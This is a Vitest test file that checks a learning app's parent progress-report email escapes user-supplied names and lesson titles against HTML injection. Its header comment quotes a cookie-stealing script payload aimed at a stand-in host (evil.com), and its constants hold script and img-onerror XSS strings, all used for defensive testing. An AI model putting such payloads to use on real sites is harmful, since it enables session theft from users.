/**
 * AUTOMATED RISK: Email HTML injection / XSS prevention
 *
 * Verifies that user-supplied strings (names, email addresses, lesson titles)
 * are properly HTML-escaped before being injected into transactional email HTML.
 *
 * An attacker with a crafted account name like:
 *   <script>document.location='evil.com?c='+document.cookie</script>
 * must not be able to inject executable JS into a parent's inbox.
 */

import { describe, it, expect } from "vitest";
import { generateParentProgressReport } from "@/lib/emails/parent-progress-report";

const XSS_PAYLOAD    = '<script>alert("xss")</script>';
const HTML_INJECTION = '<img src=x onerror="steal()">';
const AMP_INJECTION  = "Jack & Jill";
const QUOTE_INJECT   = 'He said "hello" to <her>';
const APOSTROPHE     = "O'Brien's Learning";

function baseData(overrides = {}) {
  return {
    studentName: "Test Student",
    parentName:  "Test Parent",
    userPlan: "complete" as const,
    lessonsWatched: 3,
    totalLessons: 100,
    briefingsRead: 2,
    studyTimeHours: 1.5,
    currentLesson: { number: 3, title: "The Early Life", status: "in_progress" as const },
    suggestedNextLesson: { number: 4, title: "The Prophet's Character" },
    weeklyLessons: 1,
    weeklyBriefings: 1,
    weeklyStudyTime: 0.5,
    hasWeeklyActivity: true,
    ...overrides,
  };
}

describe("generateParentProgressReport — studentName XSS", () => {
  it("escapes <script> tags in studentName", () => {
    const html = generateParentProgressReport(baseData({ studentName: XSS_PAYLOAD }));
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("</script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes img onerror injection in studentName", () => {
    const html = generateParentProgressReport(baseData({ studentName: HTML_INJECTION }));
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img");
  });

  it("escapes ampersand in studentName", () => {
    const html = generateParentProgressReport(baseData({ studentName: AMP_INJECTION }));
    expect(html).not.toContain("Jack & Jill");
    expect(html).toContain("&amp;");
  });

  it("escapes double quotes in studentName", () => {
    const html = generateParentProgressReport(baseData({ studentName: QUOTE_INJECT }));
    expect(html).not.toContain('"hello"');
    expect(html).toContain("&quot;");
  });

  it("escapes apostrophe in studentName", () => {
    const html = generateParentProgressReport(baseData({ studentName: APOSTROPHE }));
    expect(html).toContain("&#x27;");
  });
});

describe("generateParentProgressReport — parentName XSS", () => {
  it("escapes <script> in parentName", () => {
    const html = generateParentProgressReport(baseData({ parentName: XSS_PAYLOAD }));
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });
});

describe("generateParentProgressReport — lesson title XSS", () => {
  it("escapes <script> in currentLesson.title (in_progress status — title shown in current-lesson card)", () => {
    const html = generateParentProgressReport(
      baseData({
        currentLesson: { number: 1, title: XSS_PAYLOAD, status: "in_progress" as const },
      })
    );
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes HTML injection in suggestedNextLesson.title (rendered when currentLesson is completed)", () => {
    // suggestedNextLesson.title appears in the "Recommended Next Step" section
    // only when currentLesson.status === "completed" OR lessonsWatched === 0.
    const html = generateParentProgressReport(
      baseData({
        currentLesson: { number: 3, title: "The Early Life", status: "completed" as const },
        suggestedNextLesson: { number: 4, title: HTML_INJECTION },
      })
    );
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img");
  });

  it("escapes HTML injection in suggestedNextLesson.title (rendered when lessonsWatched === 0)", () => {
    const html = generateParentProgressReport(
      baseData({
        lessonsWatched: 0,
        suggestedNextLesson: { number: 1, title: HTML_INJECTION },
      })
    );
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img");
  });
});

describe("generateParentProgressReport — legitimate content not mangled", () => {
  it("preserves normal names correctly", () => {
    const html = generateParentProgressReport(baseData({ studentName: "Muhammad Ali" }));
    expect(html).toContain("Muhammad Ali");
  });

  it("produces valid HTML structure (DOCTYPE, html, body)", () => {
    const html = generateParentProgressReport(baseData());
    expect(html).toContain("<!DOCTYPE html>");
    expect(html).toContain("<html>");
    expect(html).toContain("</html>");
    expect(html).toContain("<body");
  });
});
